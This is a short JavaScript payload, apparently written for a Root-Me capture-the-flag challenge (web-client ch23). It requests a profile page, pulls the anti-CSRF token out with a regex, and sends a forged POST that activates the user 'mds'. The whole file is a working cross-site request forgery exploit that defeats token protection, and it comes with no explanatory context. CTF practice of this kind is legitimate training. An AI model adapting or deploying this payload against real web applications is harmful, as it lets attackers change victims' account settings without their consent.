var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
req.send();
function handleResponse() {
    var tokena = this.responseText.match(/name="token" value="(\w+)"/)[1];

    var formData = new FormData();
    formData.append('username', 'mds');
    formData.append('status', 'on');
    formData.append('token', tokena);

    var changeReq = new XMLHttpRequest();
    changeReq.open('post', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
    changeReq.send(formData);
};
